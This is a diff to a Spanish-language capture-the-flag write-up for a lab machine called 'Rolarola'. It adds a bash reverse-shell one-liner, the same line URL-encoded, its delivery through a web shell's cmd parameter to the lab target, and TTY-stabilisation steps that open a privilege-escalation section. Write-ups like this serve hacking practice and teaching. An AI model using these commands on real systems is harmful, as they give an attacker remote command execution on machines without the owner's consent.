@@ -202,6 +202,63 @@ creamos el payload, nos vamos a la pagina `https://www.revshells.com/` y rellena
 ![imagen_CTF](images/Rolarola/21.png)
 
 
+lo ajustamos un poco (aunque así tal cual valdría):
+
+```bash
+bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
+```
+
+ahora lo urlencodeamos, vamos a esta página por ejemplo `https://www.urlencoder.org/`:
+
+
+![imagen_CTF](images/Rolarola/22.png)
+
+
+nos da como resultado:
+```
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
+```
+
+8-lo incorporamos como cmando a nuesta pagina con payload:
+
+
+```bash
+http://172.17.0.2/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%22
+```
+
+![imagen_CTF](images/Rolarola/23.png)
+
+comprobamos si nos ha llegado la revshell:
+
+
+![imagen_CTF](images/Rolarola/24.png)
+
+
+Pues estamos dentro
+
+
+
+## ESCALADA DE PRIVILEGIOS
+
+
+lo primero vamos a hacer un tratamiento de la tty:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+Ctrl+z para salir y dejarlo en segundo plano
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 54 columns 235 en mi caso son estas las dimensiones con stty -a en una consola nueva puedes ver tus dimensiones
+```
+
+
+
+
+
+
+
 
 
 
